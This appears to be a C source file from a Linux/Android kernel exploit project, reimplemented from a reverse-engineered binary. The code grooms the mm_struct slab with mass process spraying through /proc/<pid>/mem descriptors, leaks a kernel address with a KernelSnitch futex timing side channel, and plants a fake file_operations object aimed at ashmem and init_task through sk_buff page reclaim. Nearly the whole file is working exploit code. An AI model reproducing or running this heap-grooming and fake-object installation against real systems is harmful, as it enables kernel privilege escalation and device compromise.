/* source: FUN_00106288's grooming choreography, reused from this
 * project's own proven src/util.c:prepare_kernel_page() (see groom.h for
 * the exact-match evidence). Only the final content write differs: this
 * calls build_fops_install_object() instead of the old engine's
 * put_slide_bank_entry(). */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "diag_checkpoint.h"
#include "fops_install.h"
#include "groom.h"
#include "slabinfo.h"

/* Debug instrumentation (H0): attribute the groom+install wall time to its
 * sub-phases (process spray, KernelSnitch collision search, bruteforce leak).
 * Prints to stderr only; no behavior change. */
static uint64_t groom_now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u;
}

static void groom_dbg(const char *name, uint64_t t0, uint64_t *last) {
  uint64_t n = groom_now_ms();
  fprintf(stderr, "[groom] dbg phase=%s t=+%llums dt=%llums\n", name,
          (unsigned long long)(n - t0), (unsigned long long)(n - *last));
  *last = n;
}

/* KernelSnitch tuning (experiment): getenv + strtol clamped to [lo,hi],
 * falling back on any parse error or out-of-range value. */
static long groom_env_long_clamped(const char *name, long fallback, long lo,
                                    long hi) {
  const char *raw = getenv(name);
  if (!raw || !*raw) return fallback;
  errno = 0;
  char *end = NULL;
  long v = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || v < lo || v > hi) {
    return fallback;
  }
  return v;
}
#include "kernelsnitch/kernelsnitch.h"

#define OSS_PAGE_SIZE 4096
#define OSS_MM_ORDER 3
#define OSS_MM_STRUCT_SZ 0x400
#define OSS_ORDER3_SIZE (OSS_PAGE_SIZE << OSS_MM_ORDER) /* 0x8000 */
#define OSS_SKB_SEND_SIZE FOPS_INSTALL_PAGE_SIZE         /* exact 0x8e80 */
#define OSS_MM_PARTIALS 5
#define OSS_KSNITCH_COLLISIONS 4
#define OSS_KSNITCH_REPEAT 64
#define OSS_SKB_RECLAIM_SENDS 64
#define OSS_SKB_RECLAIM_MIN_FULL 48
#define OSS_RECLAIM_QUIET_SAMPLE_MS 25
#define OSS_RECLAIM_QUIET_STREAK 3
#define OSS_RECLAIM_QUIET_MAX_SAMPLES 40

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

static int pin_reclaim_to_cpu0(void);

static pid_t clone_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) {
      _exit(0);
    }
    /* source: FUN_00105ef0 -> FUN_00104bf0 */
    if (pin_reclaim_to_cpu0() != 0) {
      _exit(1);
    }
    for (;;) {
      pause();
    }
  }
  return child;
}

static struct kernelsnitch_shared_state *g_ks;
static struct kernelsnitch_shared_state *g_ks_verify;

static pid_t clone_leak_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(g_ks);
    kernelsnitch_find_collisions(g_ks_verify);
    _exit(0);
  }
  return child;
}

static int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return open(path, O_RDONLY);
}

static void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
    return;
  }
  while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {
  }
}

static int init_ctx(struct mm_ctx *ctx, size_t cnt) {
  memset(ctx, 0, sizeof(*ctx));
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
  if (!ctx->childs || !ctx->memfds) {
    free(ctx->childs);
    free(ctx->memfds);
    memset(ctx, 0, sizeof(*ctx));
    return 0;
  }
  for (size_t i = 0; i < cnt; i++) {
    ctx->childs[i] = -1;
    ctx->memfds[i] = -1;
  }
  return 1;
}

static void cleanup_ctx(struct mm_ctx *ctx) {
  if (!ctx) {
    return;
  }
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds && ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
    if (ctx->childs && ctx->childs[i] > 0) {
      kill_child(ctx->childs[i]);
      ctx->childs[i] = -1;
    }
  }
  free(ctx->childs);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

static void release_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

/* source: fcn.000044f4 (this project's src/main.c:app_main() equivalent),
 * raw vaddr 0x4520-0x4570 -- getrlimit/setrlimit raising RLIMIT_NOFILE
 * and RLIMIT_NPROC's soft limit to the hard limit, confirmed via raw
 * disasm with asm.varsub disabled (r2's default variable naming
 * collided misleadingly with this function's own stack canary slot --
 * double-checked because of that). Applied here (not just in main.c's
 * app_main(), which is the closed binary's real call site) so every
 * test harness in this project that calls groom_and_install_fops_object
 * directly gets the same protection -- this is exactly the class of fix
 * for the "F_SETPIPE_SZ Operation not permitted" fd/pipe-page budget
 * exhaustion this project separately root-caused earlier, and this
 * function is the one that forks and holds open up to ~1279 memfds in
 * one call. Non-fatal here (unlike app_main()'s copy) so a standalone
 * test harness run as a less-privileged user still proceeds and lets
 * the real spray/reclaim logic surface its own, more specific error if
 * fd exhaustion actually becomes a problem. */
static void raise_rlimit_to_max_best_effort(int resource) {
  struct rlimit rl;
  if (getrlimit(resource, &rl) == 0) {
    rl.rlim_cur = rl.rlim_max;
    setrlimit(resource, &rl);
  }
}

/* source: FUN_00104bf0, called by FUN_00106288 immediately after the
 * priming sendmsg. kernelsnitch_bruteforce() deliberately clears the
 * caller's affinity, so the CPU-0 pin done by app_main is no longer in
 * effect here. The closed payload restores it before freeing the mm slabs
 * and allocating the reclaim pages; both operations must use the same
 * per-CPU page lists. */
static int pin_reclaim_to_cpu0(void) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  return sched_setaffinity(0, sizeof(set), &set);
}

static uint64_t load_u64(const unsigned char *buf, size_t off) {
  uint64_t value;
  memcpy(&value, buf + off, sizeof(value));
  return value;
}

static uint64_t fops_object_fingerprint(const unsigned char *buf) {
  uint64_t hash = 1469598103934665603ULL;
  for (size_t i = 0; i < FOPS_INSTALL_PAGE_SIZE; i++) {
    hash ^= buf[i];
    hash *= 1099511628211ULL;
  }
  return hash;
}

static int validate_fops_object(const unsigned char *buf,
                                uint64_t aligned_base) {
  return load_u64(buf, 0x2000) == 0 &&
         load_u64(buf, 0x2008) == (aligned_base | 0x14e8ULL) &&
         load_u64(buf, 0x2218) == (aligned_base | 0x14d0ULL) &&
         load_u64(buf, 0x2220) == (aligned_base | 0x14d0ULL) &&
         load_u64(buf, 0x2228) == 1;
}

static int validate_mm_candidate(uint64_t leaked, uint64_t *aligned_base,
                                 size_t *object_index) {
  if (leaked < KERNELSNITCH_IDENTITY_START ||
      leaked >= KERNELSNITCH_IDENTITY_END ||
      (leaked & (OSS_MM_STRUCT_SZ - 1)) != 0) {
    return 0;
  }
  uint64_t base = leaked & ~(uint64_t)(OSS_ORDER3_SIZE - 1);
  size_t index = (size_t)((leaked - base) / OSS_MM_STRUCT_SZ);
  if ((base & (OSS_ORDER3_SIZE - 1)) != 0 || index >= 32) {
    return 0;
  }
  *aligned_base = base;
  *object_index = index;
  return 1;
}

struct reclaim_slab_snapshot {
  struct mm_slabinfo mm;
  struct mm_slabinfo skb;
  struct mm_slabinfo kmalloc4k;
};

static int read_reclaim_slabs(struct reclaim_slab_snapshot *out) {
  return read_named_slabinfo("mm_struct", &out->mm) &&
         read_named_slabinfo("skbuff_head_cache", &out->skb) &&
         read_named_slabinfo("kmalloc-4k", &out->kmalloc4k);
}

static int slab_activity_equal(const struct mm_slabinfo *a,
                               const struct mm_slabinfo *b) {
  return a->active_objs == b->active_objs && a->num_objs == b->num_objs &&
         a->active_slabs == b->active_slabs &&
         a->num_slabs == b->num_slabs;
}

static int reclaim_slabs_equal(const struct reclaim_slab_snapshot *a,
                               const struct reclaim_slab_snapshot *b) {
  return slab_activity_equal(&a->mm, &b->mm) &&
         slab_activity_equal(&a->skb, &b->skb) &&
         slab_activity_equal(&a->kmalloc4k, &b->kmalloc4k);
}

static int wait_for_reclaim_quiet_window(int *samples_out) {
  struct reclaim_slab_snapshot previous;
  if (!read_reclaim_slabs(&previous)) {
    return 0;
  }
  int streak = 0;
  for (int sample = 1; sample <= OSS_RECLAIM_QUIET_MAX_SAMPLES; sample++) {
    struct timespec delay = {
        .tv_sec = 0,
        .tv_nsec = OSS_RECLAIM_QUIET_SAMPLE_MS * 1000L * 1000L,
    };
    while (nanosleep(&delay, &delay) != 0 && errno == EINTR) {
    }
    struct reclaim_slab_snapshot current;
    if (!read_reclaim_slabs(&current)) {
      return 0;
    }
    streak = reclaim_slabs_equal(&previous, &current) ? streak + 1 : 0;
    previous = current;
    if (streak >= OSS_RECLAIM_QUIET_STREAK) {
      *samples_out = sample;
      fprintf(stderr,
              "[groom] reclaim quiet pass samples=%d streak=%d "
              "mm=%lu/%lu skb=%lu/%lu kmalloc4k=%lu/%lu\n",
              sample, streak, current.mm.active_objs, current.mm.num_objs,
              current.skb.active_objs, current.skb.num_objs,
              current.kmalloc4k.active_objs, current.kmalloc4k.num_objs);
      return 1;
    }
  }
  *samples_out = OSS_RECLAIM_QUIET_MAX_SAMPLES;
  return 0;
}

static uint64_t groom_and_install_fops_object_impl(
    uint64_t kernel_base, uint64_t ashmem_misc_fops_addr,
    uint64_t init_task_addr) {
  raise_rlimit_to_max_best_effort(RLIMIT_NOFILE);
  raise_rlimit_to_max_best_effort(RLIMIT_NPROC);

  uint64_t dbg_t0 = groom_now_ms();
  uint64_t dbg_last = dbg_t0;

  size_t mm_objs_per_slab = OSS_ORDER3_SIZE / OSS_MM_STRUCT_SZ; /* 32 */

  struct mm_ctx prepare_ctx = {0}, spray_ctx = {0}, pre_ctx = {0},
                post_ctx = {0};
  unsigned char *skb_buf = NULL;
  pid_t child_leak = -1;
  int memfd_leak = -1;
  int reclaim_sv[2] = {-1, -1};
  int pcp_sv[2] = {-1, -1};
  uint64_t result = 0;

  if (!init_ctx(&prepare_ctx, 32 * mm_objs_per_slab) || /* 1024 */
      !init_ctx(&spray_ctx,
                (1 + OSS_MM_PARTIALS) * mm_objs_per_slab) || /* 192 */
      !init_ctx(&pre_ctx, mm_objs_per_slab - 1) ||            /* 31 */
      !init_ctx(&post_ctx, mm_objs_per_slab)) {               /* 32 */
    fprintf(stderr, "[groom] context allocation failed\n");
    goto cleanup;
  }

  skb_buf = malloc(OSS_SKB_SEND_SIZE);
  if (!skb_buf) {
    fprintf(stderr, "[groom] skb buffer allocation failed\n");
    goto cleanup;
  }
  memset(skb_buf, 0x41, OSS_SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    if (prepare_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] prepare clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
    if (prepare_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] prepare memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  /* FUN_00106288 kills all 1024 prepare children immediately after every
   * /proc/<pid>/mem fd is open. Those fds alone pin the mm_struct objects;
   * the later two drain waves release selected fds, not live processes. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
    prepare_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    if (spray_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] spray clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
    if (spray_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] spray memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }

  groom_dbg("proc-spray-done", dbg_t0, &dbg_last); /* prepare 1024 + spray 192 */

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (cpu_count <= 0) {
    fprintf(stderr, "[groom] invalid online CPU count=%d\n", cpu_count);
    goto cleanup;
  }
  g_ks = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
                            OSS_KSNITCH_COLLISIONS, 0, 0);
  g_ks_verify = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
                                   OSS_KSNITCH_COLLISIONS, 0, 0);
  if (!g_ks || !g_ks_verify) {
    fprintf(stderr, "[groom] kernelsnitch dual setup failed\n");
    goto cleanup;
  }
  {
    /* Experiment knobs; defaults preserve the closed profile. Repeat is
     * bounded by average (>=8) and the fixed __times[] size (<=128). */
    long ks_appended = groom_env_long_clamped(
        "KSNITCH_APPENDED", (long)g_ks->appended_futexes, 256, APPENDED_FUTEXES);
    long ks_repeat = groom_env_long_clamped(
        "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT, OSS_KSNITCH_REPEAT,
        REPEAT_MEASUREMENT);
    kernelsnitch_set_profile(g_ks, (size_t)ks_appended, (size_t)ks_repeat,
                              g_ks->average);
    kernelsnitch_set_profile(g_ks_verify, (size_t)ks_appended,
                              (size_t)ks_repeat, g_ks_verify->average);
    fprintf(stderr,
            "[groom] ksnitch profile oracles=2 appended=%zu repeat=%zu "
            "average=%zu confirmations=%zu\n",
            g_ks->appended_futexes, g_ks->repeat_measurement, g_ks->average,
            g_ks->collision_confirmations);
  }
  groom_dbg("ksnitch-setup", dbg_t0, &dbg_last);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
    if (pre_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] pre clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  child_leak = clone_leak_child();
  if (child_leak < 0) {
    fprintf(stderr, "[groom] leak clone failed errno=%d\n", errno);
    goto cleanup;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
    if (post_ctx.childs[i] < 0) {
      fprintf(stderr, "[groom] post clone failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
    if (pre_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] pre memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }
  memfd_leak = open_memfd(child_leak);
  if (memfd_leak < 0) {
    fprintf(stderr, "[groom] leak memfd failed errno=%d\n", errno);
    goto cleanup;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
    if (post_ctx.memfds[i] < 0) {
      fprintf(stderr, "[groom] post memfd failed index=%zu errno=%d\n", i,
              errno);
      goto cleanup;
    }
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
    pre_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
    post_ctx.childs[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
    spray_ctx.childs[i] = -1;
  }
  pid_t leak_waited;
  do {
    leak_waited = waitpid(child_leak, NULL, 0);
  } while (leak_waited < 0 && errno == EINTR);
  if (leak_waited != child_leak) {
    fprintf(stderr, "[groom] leak child wait failed errno=%d\n", errno);
    goto cleanup;
  }
  child_leak = -1;
  groom_dbg("find-collisions-done", dbg_t0, &dbg_last); /* 4096-thread append + scan */

  int primary_collisions = kernelsnitch_found_collisions(g_ks);
  int verify_collisions = kernelsnitch_found_collisions(g_ks_verify);
  fprintf(stderr,
          "[groom] ksnitch oracle=primary baseline=%zu threshold=%zu "
          "min=%zu confirmed=%zu pass=%d\n",
          g_ks->collision_baseline, g_ks->collision_threshold,
          g_ks->collision_min_time, g_ks->confirmed_collisions,
          primary_collisions);
  fprintf(stderr,
          "[groom] ksnitch oracle=verify baseline=%zu threshold=%zu "
          "min=%zu confirmed=%zu pass=%d\n",
          g_ks_verify->collision_baseline, g_ks_verify->collision_threshold,
          g_ks_verify->collision_min_time, g_ks_verify->confirmed_collisions,
          verify_collisions);
  if (!primary_collisions || !verify_collisions) {
    fprintf(stderr, "[groom] kernelsnitch dual collision finding failed\n");
    goto cleanup;
  }

  kernelsnitch_bruteforce(g_ks);
  kernelsnitch_bruteforce(g_ks_verify);
  uint64_t leaked = g_ks->mm_struct;
  uint64_t verified_leak = g_ks_verify->mm_struct;
  if (leaked == (uint64_t)-1 || verified_leak == (uint64_t)-1 ||
      leaked != verified_leak) {
    fprintf(stderr,
            "[groom] kernelsnitch dual leak rejected primary=%016llx "
            "verify=%016llx\n",
            (unsigned long long)leaked, (unsigned long long)verified_leak);
    goto cleanup;
  }
  groom_dbg("bruteforce-done", dbg_t0, &dbg_last); /* dual timing leak */

  /* Closed FUN_00106288 derives every kernel pointer from A directly:
   * A = candidate & ~0x7fff. The skb user-data starts at D=A-0xe80, so
   * scratch+0x2000 lands at A+0x1180; D must not replace A in pointers. */
  uint64_t aligned_base = 0;
  size_t object_index = 0;
  if (!validate_mm_candidate(leaked, &aligned_base, &object_index)) {
    fprintf(stderr, "[groom] mm candidate geometry rejected leaked=%016llx\n",
            (unsigned long long)leaked);
    goto cleanup;
  }
  fprintf(stderr,
          "[groom] mm leaked=%016llx aligned_base=%016llx object_index=%zu "
          "dual_match=1\n",
          (unsigned long long)leaked, (unsigned long long)aligned_base,
          object_index);

  build_fops_install_object(skb_buf, aligned_base, kernel_base,
                             ashmem_misc_fops_addr, init_task_addr);
  uint64_t object_hash = fops_object_fingerprint(skb_buf);
  if (!validate_fops_object(skb_buf, aligned_base)) {
    fprintf(stderr,
            "[groom] local fake fops validation failed hash=%016llx\n",
            (unsigned long long)object_hash);
    goto cleanup;
  }
  fprintf(stderr,
          "[groom] local fake fops owner=0 layout=pass hash=%016llx\n",
          (unsigned long long)object_hash);

  if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv) != 0) {
    fprintf(stderr, "[groom] reclaim socketpair failed errno=%d\n", errno);
    goto cleanup;
  }
  int sndbuf = 1 << 20;
  if (setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                 sizeof(sndbuf)) != 0) {
    fprintf(stderr, "[groom] SO_SNDBUF failed errno=%d\n", errno);
    goto cleanup;
  }
  int effective_sndbuf = 0;
  socklen_t effective_sndbuf_len = sizeof(effective_sndbuf);
  if (getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &effective_sndbuf,
                 &effective_sndbuf_len) != 0 || effective_sndbuf < sndbuf) {
    fprintf(stderr,
            "[groom] SO_SNDBUF effective rejected request=%d effective=%d "
            "errno=%d\n",
            sndbuf, effective_sndbuf, errno);
    goto cleanup;
  }
  fprintf(stderr, "[groom] SO_SNDBUF request=%d effective=%d\n", sndbuf,
          effective_sndbuf);
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags < 0 || fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK) != 0) {
    fprintf(stderr, "[groom] reclaim nonblock failed errno=%d\n", errno);
    goto cleanup;
  }
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) != 0) {
    fprintf(stderr, "[groom] pcp socketpair failed errno=%d\n", errno);
    goto cleanup;
  }

  struct iovec iov = {.iov_base = skb_buf, .iov_len = OSS_SKB_SEND_SIZE};
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  ssize_t pcp_sent;
  do {
    pcp_sent = sendmsg(pcp_sv[0], &msg, 0);
  } while (pcp_sent < 0 && errno == EINTR);
  if (pcp_sent != (ssize_t)OSS_SKB_SEND_SIZE) {
    fprintf(stderr,
            "[groom] pcp sendmsg incomplete sent=%zd want=%d errno=%d\n",
            pcp_sent, OSS_SKB_SEND_SIZE, pcp_sent < 0 ? errno : 0);
    goto cleanup;
  }

  if (pin_reclaim_to_cpu0() != 0) {
    fprintf(stderr, "[groom] CPU-0 reclaim pin failed errno=%d\n", errno);
    goto cleanup;
  }

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();

  /* FUN_00106288 splits the prepare-slab drain in two capped waves.
   * The first 16 leaders are released before the spray/target slabs;
   * the remaining 16 are released only after the leak fd below. */
  size_t prepare_slab_count = prepare_ctx.mm_cnt / mm_objs_per_slab;
  size_t prepare_early_drains = prepare_slab_count;
  if (prepare_early_drains > 16) {
    prepare_early_drains = 16;
  }
  for (size_t i = 0; i < prepare_early_drains; i++) {
    size_t index = i * mm_objs_per_slab;
    close(prepare_ctx.memfds[index]);
    prepare_ctx.memfds[index] = -1;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    close(spray_ctx.memfds[i]);
    spray_ctx.memfds[i] = -1;
  }
  size_t target_pre = pre_ctx.mm_cnt - 1;
  close(pre_ctx.memfds[target_pre]);
  pre_ctx.memfds[target_pre] = -1;
  close(post_ctx.memfds[0]);
  post_ctx.memfds[0] = -1;
  for (size_t i = 0; i < target_pre; i++) {
    close(pre_ctx.memfds[i]);
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    close(post_ctx.memfds[i]);
    post_ctx.memfds[i] = -1;
  }

  close(pcp_sv[0]);
  close(pcp_sv[1]);
  pcp_sv[0] = -1;
  pcp_sv[1] = -1;
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  close(memfd_leak);
  memfd_leak = -1;
  size_t prepare_late_drains = prepare_slab_count - prepare_early_drains;
  if (prepare_late_drains > 16) {
    prepare_late_drains = 16;
  }
  for (size_t i = 0; i < prepare_late_drains; i++) {
    size_t index = (prepare_early_drains + i) * mm_objs_per_slab;
    close(prepare_ctx.memfds[index]);
    prepare_ctx.memfds[index] = -1;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
  size_t drain_triggers = prepare_early_drains + prepare_late_drains;

  int reclaim_sent = 0;
  int reclaim_incomplete = 0;
  for (int i = 0; i < OSS_SKB_RECLAIM_SENDS; i++) {
    ssize_t sent;
    do {
      errno = 0;
      sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    } while (sent < 0 && errno == EINTR);
    if (sent == (ssize_t)OSS_SKB_SEND_SIZE) {
      reclaim_sent++;
      continue;
    }
    if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
      break;
    }
    reclaim_incomplete = 1;
    break;
  }
  fprintf(stderr,
          "[groom] mm drain triggers=%zu sk_buff reclaim sends=%d/%d\n",
          drain_triggers, reclaim_sent, OSS_SKB_RECLAIM_SENDS);

  long reclaim_min = groom_env_long_clamped(
      "RMG_RECLAIM_MIN_FULL", OSS_SKB_RECLAIM_MIN_FULL,
      OSS_SKB_RECLAIM_MIN_FULL, OSS_SKB_RECLAIM_SENDS);
  if (reclaim_sent < reclaim_min || reclaim_incomplete) {
    fprintf(stderr,
            "[groom] reclaim batch rejected full=%d minimum=%ld "
            "incomplete=%d\n",
            reclaim_sent, reclaim_min, reclaim_incomplete);
    goto cleanup;
  }

  int quiet_samples = 0;
  if (!wait_for_reclaim_quiet_window(&quiet_samples)) {
    fprintf(stderr,
            "[groom] reclaim quiet window rejected samples=%d required=%d\n",
            quiet_samples, OSS_RECLAIM_QUIET_STREAK);
    goto cleanup;
  }
  char checkpoint[160];
  snprintf(checkpoint, sizeof(checkpoint),
           "groom-pretrigger leak=%016llx idx=%zu sends=%d quiet=%d hash=%016llx",
           (unsigned long long)leaked, object_index, reclaim_sent,
           quiet_samples, (unsigned long long)object_hash);
  oss_diag_checkpoint(checkpoint);

  groom_dbg("drain-reclaim-done", dbg_t0, &dbg_last); /* build+socketpair+drain+reclaim */

  /* Keep reclaim_sv open: queued skbs must remain alive through trigger. */
  result = aligned_base;
  reclaim_sv[0] = -1;
  reclaim_sv[1] = -1;

cleanup:
  if (g_ks) {
    kernelsnitch_cleanup(g_ks);
    g_ks = NULL;
  }
  if (g_ks_verify) {
    kernelsnitch_cleanup(g_ks_verify);
    g_ks_verify = NULL;
  }
  if (child_leak > 0) {
    kill_child(child_leak);
  }
  if (memfd_leak >= 0) {
    close(memfd_leak);
  }
  for (size_t i = 0; i < 2; i++) {
    if (pcp_sv[i] >= 0) {
      close(pcp_sv[i]);
    }
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
    }
  }
  if (result) {
    /* Preserve the surviving mm fds through the trigger, matching the old
     * success path. The attempt/keeper process owns their lifetime. */
    release_ctx_storage(&post_ctx);
    release_ctx_storage(&pre_ctx);
    release_ctx_storage(&spray_ctx);
    release_ctx_storage(&prepare_ctx);
  } else {
    cleanup_ctx(&post_ctx);
    cleanup_ctx(&pre_ctx);
    cleanup_ctx(&spray_ctx);
    cleanup_ctx(&prepare_ctx);
  }
  free(skb_buf);
  return result;
}

uint64_t groom_and_install_fops_object(uint64_t kernel_base,
                                        uint64_t ashmem_misc_fops_addr,
                                        uint64_t init_task_addr) {
  return groom_and_install_fops_object_impl(kernel_base, ashmem_misc_fops_addr,
                                             init_task_addr);
}
